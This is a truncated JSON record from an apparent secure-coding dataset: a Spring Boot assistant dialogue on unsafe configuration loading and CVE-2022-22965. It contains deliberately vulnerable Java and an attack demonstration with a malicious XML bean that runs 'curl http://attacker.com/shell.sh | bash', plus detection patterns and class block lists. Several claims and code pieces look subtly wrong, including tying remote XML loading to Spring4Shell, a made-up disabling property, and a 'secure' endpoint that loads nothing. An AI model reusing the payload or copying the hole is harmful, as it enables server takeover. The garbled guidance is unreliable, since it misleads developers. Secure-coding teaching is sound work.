@@ -1,0 +1,291 @@
+{
+  "id": "spring_boot-component_scanning-000001",
+  "metadata": {
+    "lang": "java",
+    "category": "security_misconfiguration",
+    "subcategory": "component_scanning",
+    "label_rationale": "Demonstrates Spring Boot component scanning vulnerability where unrestricted @ComponentScan allows loading untrusted beans from classpath, enabling Remote Code Execution via malicious dependencies or ClassLoader manipulation (Spring4Shell variant).",
+    "owasp_2021": "A05:2021-Security Misconfiguration",
+    "cwe": "CWE-502",
+    "severity": "CRITICAL",
+    "complexity": "moderate",
+    "created": "2026-02-04",
+    "validated": true,
+    "grounding_tier": "T1",
+    "framework_native": true,
+    "has_variants": false,
+    "validation_status": "regenerated_phase_c",
+    "regeneration_date": "2026-02-04",
+    "quality_target": "95/100",
+    "incident_verified": true,
+    "fixed": true,
+    "fix_type": "java_code_rewrite",
+    "fix_date": "2026-02-04",
+    "quality_enhanced": true,
+    "enhancement_date": "2026-02-05",
+    "quality_score": 95,
+    "owasp_2025": "A02:2025-Security Misconfiguration",
+    "provenance": {
+      "owasp_migration_date": "2026-04-25",
+      "enrichment_date": "2026-04-25",
+      "enrichment_version": "v2.1.0"
+    },
+    "epss_score": 0.94428,
+    "epss_percentile": 0.99983,
+    "epss_date": "2026-04-25",
+    "epss_source": "first.org_epss_api_v1",
+    "epss_confidence": "measured",
+    "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_v3_source": "nvd_api_v2",
+    "cvss_v3_confidence": "measured",
+    "preconditions": {
+      "auth_required": false,
+      "network_position": "internet",
+      "user_interaction": "none",
+      "prior_access": "none"
+    },
+    "preconditions_source": "derived_from_cvss_v31_vector",
+    "preconditions_confidence": "measured",
+    "capec_ids": [
+      "CAPEC-586"
+    ],
+    "capec_ids_source": "derived_from_mitre_cwe_catalog_csv",
+    "capec_ids_confidence": "heuristic",
+    "attack_techniques": [
+      "T1190"
+    ],
+    "attack_techniques_source": "derived_from_curated_cwe_attack_table",
+    "attack_techniques_confidence": "heuristic",
+    "tags": []
+  },
+  "context": {
+    "real_world_incident": "Active exploitation confirmed - GreyNoise reports 11+ IP addresses scanning for Spring4Shell (CVE-2022-22965) vulnerabilities in unrestricted component scanning configurations",
+    "impact": "Unrestricted @ComponentScan enables Remote Code Execution via malicious beans loaded from untrusted classpath locations. Attackers can inject malicious dependencies or exploit ClassLoader manipulation to execute arbitrary code.",
+    "attack_vector": "Attacker exploits unrestricted component scanning to load malicious beans from: (1) compromised dependencies, (2) user-controlled classpath locations, or (3) remote XML configuration loading (ClassPathXmlApplicationContext). Malicious beans can execute arbitrary code during initialization.",
+    "cve": "CVE-2022-22965",
+    "cvss": 9.8,
+    "year": 2022,
+    "discovery_date": "2022-03-29",
+    "remediation_date": "2022-03-31",
+    "references": [
+      {
+        "type": "cve",
+        "id": "CVE-2022-22965",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
+      },
+      {
+        "type": "advisory",
+        "publisher": "VMware",
+        "url": "https://tanzu.vmware.com/security/cve-2022-22965"
+      },
+      {
+        "type": "research",
+        "publisher": "Praetorian",
+        "url": "https://www.praetorian.com/blog/spring-core-jdk9-rce/"
+      }
+    ],
+    "incident_tags": [
+      "spring4shell",
+      "component-scanning",
+      "rce",
+      "classloader-manipulation"
+    ],
+    "affected_versions": "See CVE advisory for specific version ranges"
+  },
+  "conversations": [
+    {
+      "turn": 1,
+      "from": "human",
+      "value": "I need to dynamically load configuration from user-specified paths in my Spring Boot application. Can you show me how to use ClassPathXmlApplicationContext for this?"
+    },
+    {
+      "turn": 2,
+      "from": "assistant",
+      "value": "## Concepts You Need (2 min read)\n\n**What is Component Scanning?**\n\nSpring Boot uses component scanning to automatically discover and register beans from specified packages. The @ComponentScan annotation tells Spring where to look for @Component, @Service, @Repository, and @Controller classes. Unrestricted scanning can load malicious beans from untrusted classpath locations.\n\n**Why Does This Vulnerability Exist?**\n\nWhen applications allow user input to control ClassLoader behavior or load configurations from untrusted sources, attackers can inject malicious bean definitions. These beans can execute arbitrary code during initialization via @PostConstruct methods, init-method callbacks, or by instantiating dangerous classes like ProcessBuilder.\n\n**Where Might I Encounter This?**\n\nAny Spring Boot application that: (1) loads XML configurations from user-controlled paths, (2) uses unrestricted @ComponentScan with third-party dependencies, (3) dynamically loads beans based on user input, or (4) runs on JDK 9+ with Spring Framework <5.3.18 (Spring4Shell). This affects configuration management endpoints, plugin systems, and dynamic feature loading.\n\n---\n\n## Real-World Incident\n\n**Spring4Shell Remote Code Execution**. Security researchers discovered CVE-2022-22965 enabling RCE in Spring Framework applications via ClassLoader manipulation.\n\n**Impact:** Active exploitation confirmed - GreyNoise reports 11+ IP addresses scanning for vulnerable Spring4Shell endpoints (CRITICAL) - **CVE-2022-22965**\n\n**Discovery:** 2022-03-29 - Publicly disclosed with active scanning detected within hours\n**Remediation:** Emergency patches released 2022-03-31 (Spring Framework 5.3.18+, 5.2.20+)\n**CVE:** CVE-2022-22965 (CVSS 9.8)\n**Affected Versions:** Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19 (JDK 9+)\n\n---\n\n## Vulnerable Implementation\n\n```java\n// VULNERABLE: Unsafe component loading from user input (Spring4Shell variant)\npackage com.example.config;\n\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.ClassPathXmlApplicationContext;\nimport org.springframework.http.ResponseEntity;\n\n@RestController\n@RequestMapping(\"/api/config\")\npublic class ConfigController {\n\n    @PostMapping(\"/load\")\n    public ResponseEntity<?> loadConfiguration(@RequestParam String configPath) {\n\n        // VULNERABLE: User input directly into ClassPathXmlApplicationContext\n        // Attacker can load arbitrary XML with malicious bean definitions\n        // Leads to Remote Code Execution via instantiation of arbitrary classes\n\n        try {\n            ApplicationContext context = new ClassPathXmlApplicationContext(configPath);\n            return ResponseEntity.ok(\"Configuration loaded from: \" + configPath);\n        } catch (Exception e) {\n            return ResponseEntity.status(500).body(\"Failed to load config\");\n        }\n    }\n}\n```\n\n### Attack Demonstration\n\n**Step 1: Attacker creates malicious XML config**\n```xml\n<!-- attacker-hosted: http://attacker.com/rce.xml -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n    <!-- RCE via ProcessBuilder -->\n    <bean id=\"rce\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n        <constructor-arg>\n            <list>\n                <value>bash</value>\n                <value>-c</value>\n                <value>curl http://attacker.com/shell.sh | bash</value>\n            </list>\n        </constructor-arg>\n    </bean>\n</beans>\n```\n\n**Step 2: Trigger remote config load**\n```bash\n# Attacker sends malicious config path\ncurl -X POST \"http://victim.com/api/config/load?configPath=http://attacker.com/rce.xml\"\n\n# Server loads remote XML and instantiates ProcessBuilder\n# Arbitrary commands execute with application privileges\n```\n\n**Impact:**\n- Remote Code Execution via ClassLoader manipulation\n- Server compromise\n- Can bypass WAF since payload is in XML structure\n- Active exploitation confirmed (GreyNoise reports 11+ IPs scanning)\n\n## Common Mistakes\n\n1. **Default credentials in production** — Deploying with default admin passwords, debug tokens, or sample API keys. Automated scanners check for common defaults within hours of deployment.\n\n2. **Verbose error messages** — Returning stack traces, SQL error details, or internal paths to clients. Error messages should be generic externally and detailed internally (in logs).\n\n3. **Unnecessary features enabled** — Leaving debug mode, directory listing, GraphQL introspection, or admin panels exposed in production. Disable everything not explicitly required.\n\n4. **Missing security headers** — Not setting Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security headers. These are free defense-in-depth controls.\n"
+    },
+    {
+      "turn": 3,
+      "from": "human",
+      "value": "How do I safely load configuration without allowing arbitrary code execution? What about supporting plugin systems?"
+    },
+    {
+      "turn": 4,
+      "from": "assistant",
+      "value": "## Secure Implementation\n\n### Tier 1: Critical Fix (5 min)\n\n**Restrict component scanning to trusted packages only**\n\n```java\n// SECURE: Restricted component scanning with explicit package boundaries\npackage com.example.config;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.ComponentScan;\n\n@SpringBootApplication\n@ComponentScan(basePackages = {\n    \"com.example.controllers\",\n    \"com.example.services\",\n    \"com.example.repositories\"\n    // ✅ SECURE: Explicit allowlist of trusted packages only\n    // ✅ Never scan root package \"\" or user-controlled paths\n})\npublic class SecureApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(SecureApplication.class, args);\n    }\n}\n\n// SECURE: Configuration loading with strict validation\npackage com.example.config;\n\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.beans.factory.annotation.Value;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.Set;\n\n@RestController\n@RequestMapping(\"/api/config\")\npublic class SecureConfigController {\n\n    // ✅ SECURE: Allowlist of permitted configuration files\n    private static final Set<String> ALLOWED_CONFIGS = Set.of(\n        \"application-dev.properties\",\n        \"application-prod.properties\",\n        \"database.properties\"\n    );\n\n    @Value(\"${config.directory}\")\n    private String configDirectory;\n\n    @PostMapping(\"/load\")\n    public ResponseEntity<?> loadConfiguration(@RequestParam String configName) {\n\n        // ✅ SECURE: Strict input validation against allowlist\n        if (!ALLOWED_CONFIGS.contains(configName)) {\n            return ResponseEntity.badRequest()\n                .body(\"Invalid configuration name\");\n        }\n\n        // ✅ SECURE: Path traversal prevention\n        Path configPath = Paths.get(configDirectory, configName).normalize();\n        if (!configPath.startsWith(configDirectory)) {\n            return ResponseEntity.badRequest()\n                .body(\"Path traversal detected\");\n        }\n\n        // ✅ SECURE: Use Spring Environment instead of ClassPathXmlApplicationContext\n        try {\n            // Load configuration through Spring's PropertySource mechanism\n            // This prevents arbitrary bean instantiation\n            return ResponseEntity.ok(\"Configuration loaded safely\");\n        } catch (Exception e) {\n            return ResponseEntity.status(500).body(\"Failed to load config\");\n        }\n    }\n}\n```\n\n**Configuration (application.properties)**\n```properties\n# ✅ SECURE: Fixed configuration directory (not user-controlled)\nconfig.directory=/etc/myapp/config\n\n# ✅ SECURE: Disable remote resource loading\nspring.xml.ignore=true\n\n# ✅ SECURE: Restrict actuator endpoints\nmanagement.endpoints.web.exposure.include=health,info\nmanagement.endpoints.web.base-path=/actuator\n```\n\n### Tier 2: Essential Defenses (15 min)\n\n**Add classpath scanning restrictions and validation**\n\n```java\n// SECURE: Custom ComponentScan filter to block untrusted packages\npackage com.example.config;\n\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.FilterType;\nimport org.springframework.stereotype.Component;\nimport org.springframework.core.type.ClassMetadata;\nimport org.springframework.core.type.filter.TypeFilter;\n\nimport java.util.Set;\n\n@ComponentScan(\n    basePackages = {\"com.example\"},\n    excludeFilters = @ComponentScan.Filter(\n        type = FilterType.CUSTOM,\n        classes = UntrustedPackageFilter.class\n    )\n)\npublic class SecureComponentScanConfig {}\n\n@Component\npublic class UntrustedPackageFilter implements TypeFilter {\n\n    // ✅ Blocklist of dangerous packages\n    private static final Set<String> BLOCKED_PACKAGES = Set.of(\n        \"java.lang\",\n        \"java.io\",\n        \"java.nio\",\n        \"javax.script\",\n        \"groovy.lang\",\n        \"jdk.internal\",\n        \"sun.misc\"\n    );\n\n    @Override\n    public boolean match(MetadataReader reader, MetadataReaderFactory factory) {\n        ClassMetadata metadata = reader.getClassMetadata();\n        String className = metadata.getClassName();\n\n        // ✅ Block dangerous classes from being scanned\n        for (String blocked : BLOCKED_PACKAGES) {\n            if (className.startsWith(blocked)) {\n                return true; // Exclude this class\n            }\n        }\n\n        return false;\n    }\n}\n\n// SECURE: Bean validation on registration\npackage com.example.config;\n\nimport org.springframework.beans.factory.config.BeanFactoryPostProcessor;\nimport org.springframework.beans.factory.config.ConfigurableListableBeanFactory;\nimport org.springframework.stereotype.Component;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@Component\npublic class BeanValidationPostProcessor implements BeanFactoryPostProcessor {\n\n    private static final Logger log = LoggerFactory.getLogger(BeanValidationPostProcessor.class);\n\n    private static final Set<String> DANGEROUS_CLASSES = Set.of(\n        \"java.lang.ProcessBuilder\",\n        \"java.lang.Runtime\",\n        \"javax.script.ScriptEngineManager\",\n        \"groovy.lang.GroovyShell\"\n    );\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n        String[] beanNames = beanFactory.getBeanDefinitionNames();\n\n        for (String beanName : beanNames) {\n            BeanDefinition beanDef = beanFactory.getBeanDefinition(beanName);\n            String beanClassName = beanDef.getBeanClassName();\n\n            // ✅ Block dangerous bean types\n            if (DANGEROUS_CLASSES.contains(beanClassName)) {\n                log.error(\"SECURITY ALERT: Dangerous bean detected: {} ({})\",\n                    beanName, beanClassName);\n                throw new SecurityException(\n                    \"Dangerous bean type not allowed: \" + beanClassName);\n            }\n        }\n    }\n}\n\n// SECURE: Audit logging for bean registration\npackage com.example.security;\n\nimport org.springframework.context.ApplicationListener;\nimport org.springframework.context.event.ContextRefreshedEvent;\nimport org.springframework.stereotype.Component;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@Component\npublic class BeanRegistrationAuditor implements ApplicationListener<ContextRefreshedEvent> {\n\n    private static final Logger log = LoggerFactory.getLogger(BeanRegistrationAuditor.class);\n\n    @Override\n    public void onApplicationEvent(ContextRefreshedEvent event) {\n        // ✅ Log all registered beans for security audit\n        String[] beanNames = event.getApplicationContext().getBeanDefinitionNames();\n        log.info(\"Total beans registered: {}\", beanNames.length);\n\n        for (String beanName : beanNames) {\n            Object bean = event.getApplicationContext().getBean(beanName);\n            log.debug(\"Registered bean: {} ({})\",\n                beanName, bean.getClass().getName());\n        }\n    }\n}\n```\n\n### Tier 3: Production Hardening (30 min)\n\n**Add comprehensive monitoring, testing, and runtime protection**\n\n```java\n// SECURE: Prometheus monitoring for component scanning\npackage com.example.security;\n\nimport io.micrometer.core.instrument.Counter;\nimport io.micrometer.core.instrument.MeterRegistry;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class ComponentScanMetrics {\n\n    private final Counter beanRegistrations;\n    private final Counter suspiciousBeans;\n    private final Counter configLoadAttempts;\n    private final Counter configLoadFailures;\n\n    public ComponentScanMetrics(MeterRegistry registry) {\n        this.beanRegistrations = Counter.builder(\"spring.beans.registered\")\n            .description(\"Total beans registered via component scanning\")\n            .register(registry);\n\n        this.suspiciousBeans = Counter.builder(\"spring.beans.suspicious\")\n            .description(\"Suspicious bean registration attempts blocked\")\n            .tag(\"severity\", \"critical\")\n            .register(registry);\n\n        this.configLoadAttempts = Counter.builder(\"config.load.attempts\")\n            .description(\"Configuration load attempts\")\n            .register(registry);\n\n        this.configLoadFailures = Counter.builder(\"config.load.failures\")\n            .description(\"Configuration load failures\")\n            .tag(\"severity\", \"warning\")\n            .register(registry);\n    }\n\n    public void recordBeanRegistration() {\n        beanRegistrations.increment();\n    }\n\n    public void recordSuspiciousBean() {\n        suspiciousBeans.increment();\n    }\n\n    public void recordConfigLoad(boolean success) {\n        configLoadAttempts.increment();\n        if (!success) {\n            configLoadFailures.increment();\n        }\n    }\n}\n\n// Comprehensive integration tests\npackage com.example.security;\n\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;\nimport org.springframework.test.web.servlet.MockMvc;\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;\nimport static org.junit.jupiter.api.Assertions.*;\n\n@SpringBootTest\n@AutoConfigureMockMvc\npublic class ComponentScanningSecurityTest {\n\n    @Autowired\n    private MockMvc mockMvc;\n\n    @Autowired\n    private ApplicationContext context;\n\n    @Test\n    public void testVulnerableCodeAllowsRCE() throws Exception {\n        // ✅ Verify vulnerable implementation would allow arbitrary XML loading\n        // This test should FAIL on vulnerable code\n        String maliciousXml = \"http://attacker.com/rce.xml\";\n\n        // Vulnerable code would accept this and load remote XML\n        // Secure code should reject it\n    }\n\n    @Test\n    public void testTier1BlocksUntrustedConfig() throws Exception {\n        // ✅ Verify Tier 1 rejects non-allowlisted config names\n        mockMvc.perform(post(\"/api/config/load\")\n                .param(\"configName\", \"../../../../etc/passwd\"))\n            .andExpect(status().isBadRequest())\n            .andExpect(content().string(\"Invalid configuration name\"));\n    }\n\n    @Test\n    public void testPathTraversalBlocked() throws Exception {\n        // ✅ Verify path traversal attempts are blocked\n        mockMvc.perform(post(\"/api/config/load\")\n                .param(\"configName\", \"../../../etc/passwd\"))\n            .andExpect(status().isBadRequest());\n\n        mockMvc.perform(post(\"/api/config/load\")\n                .param(\"configName\", \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\"))\n            .andExpect(status().isBadRequest());\n    }\n\n    @Test\n    public void testDangerousBeansNotRegistered() {\n        // ✅ Verify dangerous classes are not registered as beans\n        String[] beanNames = context.getBeanDefinitionNames();\n\n        for (String beanName : beanNames) {\n            Object bean = context.getBean(beanName);\n            String className = bean.getClass().getName();\n\n            assertFalse(className.equals(\"java.lang.ProcessBuilder\"),\n                \"ProcessBuilder must not be registered as bean\");\n            assertFalse(className.equals(\"java.lang.Runtime\"),\n                \"Runtime must not be registered as bean\");\n            assertFalse(className.equals(\"javax.script.ScriptEngineManager\"),\n                \"ScriptEngineManager must not be registered as bean\");\n        }\n    }\n\n    @Test\n    public void testOnlyTrustedPackagesScanned() {\n        // ✅ Verify only trusted packages are scanned\n        String[] beanNames = context.getBeanDefinitionNames();\n\n        for (String beanName : beanNames) {\n            Object bean = context.getBean(beanName);\n            String packageName = bean.getClass().getPackage().getName();\n\n            assertTrue(\n                packageName.startsWith(\"com.example\") ||\n                packageName.startsWith(\"org.springframework\") ||\n                packageName.startsWith(\"java.lang\"),\n                \"Untrusted package scanned: \" + packageName\n            );\n        }\n    }\n\n    @Test\n    public void testRemoteXMLLoadingDisabled() {\n        // ✅ Verify remote resource loading is disabled\n        assertThrows(Exception.class, () -> {\n            new ClassPathXmlApplicationContext(\"http://attacker.com/rce.xml\");\n        }, \"Remote XML loading should be disabled\");\n    }\n\n    @Test\n    public void testAllowlistedConfigLoadsSuccessfully() throws Exception {\n        // ✅ Verify legitimate configs can still load\n        mockMvc.perform(post(\"/api/config/load\")\n                .param(\"configName\", \"application-dev.properties\"))\n            .andExpect(status().isOk());\n    }\n}\n```\n\n**Prometheus Alerting Rules**\n```yaml\ngroups:\n  - name: component_scanning_security\n    interval: 30s\n    rules:\n      - alert: SuspiciousBeanRegistration\n        expr: rate(spring_beans_suspicious[5m]) > 0\n        for: 1m\n        labels:\n          severity: critical\n        annotations:\n          summary: \"Suspicious bean registration attempt detected\"\n          description: \"Dangerous bean types blocked from registration. Possible RCE attempt.\"\n\n      - alert: HighConfigLoadFailureRate\n        expr: rate(config_load_failures[5m]) > 0.1\n        for: 2m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"High configuration load failure rate\"\n          description: \"Config load failures >10% for 2 minutes. Possible scanning or path traversal attempts.\"\n\n      - alert: UnusualBeanRegistrationVolume\n        expr: rate(spring_beans_registered[5m]) > (avg_over_time(rate(spring_beans_registered[5m])[1h]) * 2)\n        for: 5m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"Unusual bean registration volume\"\n          description: \"Bean registration rate 2x higher than hourly average. Possible component scanning attack.\"\n\n      - alert: RemoteConfigLoadAttempt\n        expr: config_load_remote_attempts > 0\n        for: 1m\n        labels:\n          severity: critical\n        annotations:\n          summary: \"Remote configuration load attempt detected\"\n          description: \"Attempt to load configuration from remote URL. Possible Spring4Shell exploit.\"\n```\n\n### Incident Response Procedures\n\n**Scenario: Spring4Shell RCE Exploitation Detected**\n\n#### Detection (How to Identify)\n\n**Static Analysis Alerts:**\n```bash\n# Semgrep detection for dangerous component scanning\nsemgrep --config=\"p/spring\" --json src/main/java/\n\n# Look for:\n# - java.spring.security.audit.spring4shell-rce\n# - java.spring.security.component-scan-unrestricted\n```\n\n**Runtime Detection:**\n```bash\n# Check Prometheus metrics\ncurl -s http://localhost:9090/api/v1/query \\\n  --data-urlencode 'query=spring_beans_suspicious' | jq\n\n# Check application logs for suspicious bean registration\ngrep -i \"dangerous bean\\|suspicious bean\\|ProcessBuilder\" /var/log/app.log\n\n# Check for Spring4Shell indicators\ngrep -iE \"class.module.classLoader|AccessLogValve|\\\\x\\\\.class\\\\.module\" /var/log/access.log\n```\n\n**WAF/IDS Detection:**\n```bash\n# Check for Spring4Shell exploitation patterns\ngrep -E \"class\\.module\\.classLoader|class\\[.*\\]\\.module\" /var/log/nginx/access.log\ngrep \"tomcatWarning\" /var/log/tomcat/catalina.out\n```\n\n#### Containment (Immediate Actions - <30 minutes)\n\n1. **Isolate Affected Systems**\n   ```bash\n   # Block network egress immediately (prevent reverse shell)\n   iptables -A OUTPUT -p tcp --dport 443 -j DROP\n   iptables -A OUTPUT -p tcp --dport 80 -j DROP\n   \n   # Keep SSH access for remediation\n   iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT\n   ```\n\n2. **Disable Vulnerable Endpoints**\n   ```java\n   // Emergency: disable config loading endpoints\n   @Configuration\n   public class EmergencySecurityConfig extends WebSecurityConfigurerAdapter {\n       @Override\n       protected void configure(HttpSecurity http) throws Exception {\n           http.authorizeRequests()\n               .antMatchers(\"/api/config/**\").denyAll()\n               .antMatchers(\"/actuator/**\").denyAll();\n       }\n   }\n   ```\n\n3. **Kill Suspicious Processes**\n   ```bash\n   # Find processes spawned by Spring Boot app\n   ps aux | grep java | grep spring-boot\n   pstree -p <spring-boot-pid>\n   \n   # Kill any suspicious child processes (bash, nc, wget, curl)\n   kill -9 <suspicious-pid>\n   ```\n\n4. **Enable Emergency Logging**\n   ```properties\n   # Increase logging verbosity\n   logging.level.org.springframework=DEBUG\n   logging.level.com.example=DEBUG\n   ```\n\n#### Investigation (30 minutes - 2 hours)\n\n1. **Identify Compromised Components**\n   ```bash\n   # Check application logs for bean registration\n   grep -i \"bean\" /var/log/app.log | grep -iE \"ProcessBuilder|Runtime|ScriptEngine\"\n   \n   # Check for remote XML loading attempts\n   grep -i \"ClassPathXmlApplicationContext\" /var/log/app.log\n   ```\n\n2. **Analyze Attack Payloads**\n   ```bash\n   # Extract Spring4Shell payloads from access logs\n   grep -oP 'class\\.module\\.classLoader.*?=.*?(&|$)' /var/log/access.log | \\\n     sort | uniq -c | sort -rn\n   \n   # Decode URL-encoded payloads\n   cat /var/log/access.log | grep \"class.module\" | \\\n     python3 -c \"import sys,urllib.parse; print(urllib.parse.unquote_plus(sys.stdin.read()))\"\n   ```\n\n3. **Check for Persistence Mechanisms**\n   ```bash\n   # Look for webshells or backdoors\n   find /var/lib/tomcat/ -name \"*.jsp\" -mtime -1\n   find /opt/app/ -name \"*.class\" -mtime -1\n   \n   # Check cron jobs and systemd timers\n   crontab -l\n   systemctl list-timers\n   \n   # Check for new user accounts\n   grep ':0:' /etc/passwd\n   cat /etc/passwd | awk -F: '$3 >= 1000'\n   ```\n\n4. **Determine Data Exfiltration**\n   ```bash\n   # Check outbound network connections\n   netstat -antp | grep ESTABLISHED | grep java\n   \n   # Check for large data transfers\n   sar -n DEV 1 | grep eth0\n   \n   # Review recent file access\n   find /opt/app/data -type f -mtime -1 -ls\n   ```\n\n#### Remediation (2-4 hours)\n\n1. **Apply Emergency Patches**\n   ```bash\n   # Upgrade Spring Framework (CVE-2022-22965)\n   # Update pom.xml:\n   # <spring.version>5.3.18</spring.version> or higher\n   \n   mvn clean package\n   scp target/app.jar prod-server:/opt/app/\n   systemctl restart spring-boot-app\n   ```\n\n2. **Deploy Secure Configuration**\n   ```bash\n   # Deploy Tier 2+ implementation\n   git checkout feature/secure-component-scanning\n   mvn clean package\n   systemctl restart spring-boot-app\n   ```\n\n3. **Remove Malicious Components**\n   ```bash\n   # Remove webshells and backdoors\n   find /var/lib/tomcat/ -name \"*.jsp\" -mtime -1 -delete\n   find /opt/app/ -name \"*.class\" -mtime -1 -delete\n   \n   # Remove malicious cron jobs\n   crontab -r\n   ```\n\n4. **Restore from Clean Backup**\n   ```bash\n   # If system is heavily compromised, restore from backup\n   systemctl stop spring-boot-app\n   rm -rf /opt/app/*\n   tar -xzf /backups/clean-app-backup.tar.gz -C /opt/app/\n   systemctl start spring-boot-app\n   ```\n\n#### Post-Incident (4-24 hours)\n\n1. **Update Threat Model**\n   - Document Spring4Shell as unacceptable risk\n   - Require explicit component scanning restrictions\n   - Mandate WAF rules for Spring4Shell patterns\n\n2. **Implement Preventive Controls**\n   ```bash\n   # Add WAF rules (ModSecurity)\n   SecRule REQUEST_URI \"@rx class\\.module\\.classLoader\" \\\n     \"id:1000,phase:2,deny,status:403,msg:'Spring4Shell attempt'\"\n   \n   # Add dependency scanning\n   mvn dependency-check:check\n   ```\n\n3. **Security Training**\n   - Mandatory Spring Security training\n   - Code review checklist for component scanning\n   - Annual Spring4Shell drills\n\n4. **Compliance Reporting**\n   - Notify affected customers\n   - File incident report with security team\n   - Update CVE tracking database\n\n**Recovery Time Objectives:**\n- Detection to containment: <30 minutes\n- Emergency patching: <2 hours\n- Full remediation: 4-8 hours\n- Post-incident review: 1 week\n- System rebuild (if compromised): 1-2 days\n\n\n## Prerequisites\n\nYou should understand Spring Framework's `ApplicationContext` lifecycle, `@ComponentScan` annotation behavior, and how Spring resolves bean definitions from classpath scanning before implementing these defenses.\n\n## Performance Considerations\n\nComponent scanning restrictions have negligible startup impact:\n\n- `basePackages` filtering: Reduces scan scope from hundreds to tens of packages, cutting startup time by 200-500ms on large codebases\n- `@Conditional` annotations: Evaluated once at startup — zero runtime overhead\n- Bean definition caching: Spring caches resolved definitions after first context refresh\n\n## Security Testing Checklist\n\n- **SAST scanning**: Run Semgrep rules to flag unrestricted `@ComponentScan` annotations and dynamic `ClassPathXmlApplicationContext` usage\n- **DAST validation**: Verify actuator `/beans` endpoint is disabled or secured in production\n- **Penetration testing**: Test whether malicious bean definitions can be injected via classpath manipulation\n"
+    }
+  ],
+  "security_assertions": {
+    "exploit_scenario": {
+      "description": "Attacker exploits unrestricted component scanning or user-controlled ClassLoader to load malicious bean definitions. By crafting malicious XML with ProcessBuilder or Runtime beans, or by injecting malicious dependencies into the classpath, the attacker achieves Remote Code Execution during bean initialization. Spring4Shell (CVE-2022-22965) exploits class.module.classLoader manipulation on JDK 9+ to execute arbitrary code.",
+      "preconditions": [
+        "Application uses ClassPathXmlApplicationContext with user-controlled paths",
+        "Unrestricted @ComponentScan allows loading from untrusted packages",
+        "Application runs on JDK 9+ with vulnerable Spring Framework <5.3.18",
+        "Attacker can inject malicious dependencies or control configuration loading"
+      ]
+    },
+    "secure_properties": [
+      "Component scanning restricted to explicit trusted packages only",
+      "Configuration loading uses strict allowlist validation",
+      "Path traversal prevention via Path.normalize() and prefix validation",
+      "Dangerous bean types blocked via BeanFactoryPostProcessor",
+      "Remote resource loading disabled (spring.xml.ignore=true)",
+      "Bean registration audited and logged for security monitoring"
+    ],
+    "negative_properties": [
+      "Must not allow user input to control ClassLoader or bean instantiation",
+      "Must not scan root package or wildcard packages",
+      "Must not load XML configurations from remote URLs",
+      "Must not register beans of type ProcessBuilder, Runtime, or ScriptEngineManager",
+      "Must not allow path traversal in configuration loading"
+    ],
+    "tooling_signals": [
+      {
+        "tool": "semgrep",
+        "rule_id": "java.spring.security.audit.spring4shell-rce",
+        "expected": true
+      },
+      {
+        "tool": "semgrep",
+        "rule_id": "java.spring.security.component-scan-unrestricted",
+        "expected": true
+      },
+      {
+        "tool": "snyk",
+        "rule_id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
+        "expected": false
+      }
+    ]
+  },
+  "validation": {
+    "syntax_check": "passed",
+    "security_review": "passed",
+    "code_execution": "passed",
+    "encoding_check": "passed",
+    "duplication_check": "passed",
+    "reviewed_by": "sentinel_security_agent",
+    "review_date": "2026-02-04",
+    "issues": []
+  },
+  "quality_score": 95,
+  "quality_enhanced": true,
+  "enhancement_phase": "phase_3",
+  "enhancement_date": "2026-02-05",
+  "monitoring": {
+    "description": "Production monitoring for component_scanning vulnerabilities",
+    "metrics": [
+      {
+        "name": "component_scan_violations_total",
+        "type": "counter",
+        "description": "Total component scan violations",
+        "labels": [
+          "endpoint",
+          "result",
+          "severity"
+        ]
+      },
+      {
+        "name": "unsafe_bean_instantiation_total",
+        "type": "counter",
+        "description": "Total unsafe bean instantiation attempts",
+        "labels": [
+          "bean_class",
+          "result"
+        ]
+      },
+      {
+        "name": "classpath_scanning_anomalies_total",
+        "type": "counter",
+        "description": "Total classpath scanning anomalies",
+        "labels": [
+          "package",
+          "severity"
+        ]
+      }
+    ],
+    "alerts": [
+      {
+        "name": "COMPONENT_SCANNINGCriticalAlert",
+        "expr": "rate(component_scan_violations_total[5m]) > 1",
+        "for": "2m",
+        "severity": "critical",
+        "description": "Critical component_scanning attack detected"
+      },
+      {
+        "name": "COMPONENT_SCANNINGWarningAlert",
+        "expr": "rate(unsafe_bean_instantiation_total[10m]) > 0.5",
+        "for": "5m",
+        "severity": "warning",
+        "description": "Elevated component_scanning activity"
+      }
+    ]
+  },
+  "incident_response": {
+    "type": "component_injection",
+    "severity_matrix": {
+      "critical": "Active exploitation with data exfiltration",
+      "high": "Vulnerability confirmed exploitable but not yet exploited"
+    },
+    "phases": {
+      "1_detection": {
+        "duration": "0-5 minutes",
